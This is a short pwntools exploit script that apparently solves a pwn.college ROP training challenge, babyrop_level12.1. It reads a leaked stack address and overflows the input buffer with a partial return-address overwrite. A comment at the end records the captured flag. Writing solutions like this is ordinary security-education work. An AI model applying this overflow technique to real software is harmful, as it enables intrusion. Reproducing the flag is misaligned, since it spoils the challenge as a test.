from pwn import *

elf = context.binary = ELF("./babyrop_level12.1")
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")

io = s.process("/challenge/babyrop_level12.1")
# io = gdb.debug("./babyrop_level12.1")

io.recvuntil(b'[LEAK] Your input buffer is located at: ')
buf = int(io.recvline().strip()[:-1], 16)
info("Leak win: " + hex(buf - 0x8))

io.send(b'a'*0x60 + b'\x00\x80\xa3')
print(io.recvline())
print(io.recvline())
print(io.recvline())
print(io.recvline())
io.close()
# Flag: pwn.college{wETWMsAgY9kF2U-fz3bLdpJ_-2v.0FN2MDLxIjNyEzW}